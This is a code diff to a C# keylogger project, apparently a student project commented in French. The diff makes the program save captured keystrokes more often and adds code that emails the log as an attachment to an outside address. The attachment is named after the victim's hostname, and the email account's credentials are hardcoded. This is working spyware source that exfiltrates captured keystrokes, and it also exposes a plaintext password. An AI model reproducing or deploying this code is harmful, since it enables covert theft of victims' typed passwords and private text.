@@ -35,7 +35,7 @@ namespace ProjetKeyLogger
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
-            file_path = "TestXML.xml";
+            file_path = "../../../Fichier XML/TestXML.xml";
 
         }
 
@@ -337,7 +337,7 @@ namespace ProjetKeyLogger
                         }
 
                     }
-                    if (nb_caractere_tape > 200)
+                    if (nb_caractere_tape > 20)
                     {
                         //On enregistre le contenue en xml
                         collection_enregistrement.saveToXml(file_path);
@@ -390,12 +390,12 @@ namespace ProjetKeyLogger
 
             //definition de l'adresse mail qui envoie
             //Cette adresse à été crée spécialement pour ce projet à but non lucratif et seulement éducatif.
-            Message_Mail.From = new MailAddress("jordan.leeon2@gmail.com");
+            Message_Mail.From = new MailAddress("camenenlythiery@gmail.com");
 
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            Message_Mail.To.Add("ccamenen@outlook.fr");
+            Message_Mail.To.Add("jejarer632@nonicamy.com");
 
             //defition de l'objet du mail
             Message_Mail.Subject = Objet_Mail;
@@ -407,13 +407,22 @@ namespace ProjetKeyLogger
             Client.EnableSsl = true;
 
             //UseDefaultCredentials étant déclaré en False, il faut lui fournier les inforamtions de connexion 
-            Client.Credentials = new System.Net.NetworkCredential("jordan.leeon2@gmail.com", "projetc#2020");
+            Client.Credentials = new System.Net.NetworkCredential("camenenlythiery@gmail.com", "projetc#2020");
 
             //définition du corps du mail
             Message_Mail.Body = Corps_Mail;
 
+            //Ajout de la pièce jointe
+            System.Net.Mail.Attachment pieceJointe = new System.Net.Mail.Attachment(Chemin_Txt);
+            //On renomme le fichier pour pouvoir identifier notre victime
+            pieceJointe.Name = Dns.GetHostName() + ".xml";
+            Message_Mail.Attachments.Add(pieceJointe);
+
             //Envoie du message
             Client.Send(Message_Mail);
+
+            // Libère les ressources utilisé par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
+            Message_Mail.Dispose();
         }
 
 
